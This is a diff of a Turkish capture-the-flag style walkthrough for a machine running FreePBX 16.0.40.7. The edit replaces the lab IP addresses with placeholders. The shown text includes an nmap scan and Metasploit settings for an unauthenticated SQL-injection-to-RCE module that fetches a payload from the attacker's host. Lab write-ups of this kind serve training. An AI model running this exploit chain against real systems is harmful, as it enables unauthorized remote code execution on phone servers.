@@ -1,6 +1,6 @@
 nmap ile baslıyorum, her zamanki gibi önce hızlı port taraması:
 
-    nmap -sC -sV -p- --min-rate 5000 -oA full_scan 10.129.59.57
+    nmap -sC -sV -p- --min-rate 5000 -oA full_scan ip
 
 Açık portlar:
   - 22/tcp  -> OpenSSH 7.4
@@ -8,7 +8,7 @@ Açık portlar:
   - 443/tcp -> SSL/HTTPS, cert CN=pbxconnect
 
 /etc/hosts'a ekliyorum:
-    echo "10.129.59.57 connected.htb" >> /etc/hosts
+    echo "ip connected.htb" >> /etc/hosts
 
 Port 80'e gittiğimde FreePBX admin paneli karşılıyor. Versiyon footer'da yazıyor:
     FreePBX 16.0.40.7
@@ -47,10 +47,10 @@ Metasploit'te modülü var:
 Modülü yüklüyorum ve ayarları yapıyorum:
 
     use exploit/unix/http/freepbx_unauth_sqli_to_rce
-    set RHOSTS 10.129.59.57
+    set RHOSTS ip
     set VHOST connected.htb
     set LHOST tun0
-    set FETCH_SRVHOST 10.10.16.75
+    set FETCH_SRVHOST tun0
     run
 
 İlk birkaç denemede cronjob oluşturuluyor ama session gelmiyor. Neden?
